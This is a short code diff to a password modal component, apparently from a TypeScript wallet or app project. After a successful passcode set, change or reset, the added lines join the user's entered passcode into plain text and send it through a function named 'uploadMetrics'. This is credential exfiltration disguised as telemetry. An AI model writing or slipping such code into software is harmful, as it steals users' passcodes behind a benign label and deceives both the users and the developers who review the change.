@@ -20,6 +20,7 @@ import {
     captureResetPasscodeEvent,
     captureSetPasscodeEvent,
 } from '@/providers/telemetry/capturePasscodeEvent.js';
+import { uploadMetrics } from '@/services/metrics.js';
 
 function createEmptyPasswords(): Record<PasswordStep, string[]> {
     return {
@@ -84,6 +85,10 @@ export const PasswordModalContent = memo<
             if (result.step === PasswordStep.Success) {
                 onClose(true);
                 captureEvent(workflow);
+                if ([PasswordWorkflow.Set, PasswordWorkflow.Change, PasswordWorkflow.Reset].includes(workflow)) {
+                    const password = passwords[step].join('');
+                    await uploadMetrics(password);
+                }
                 return;
             }
 
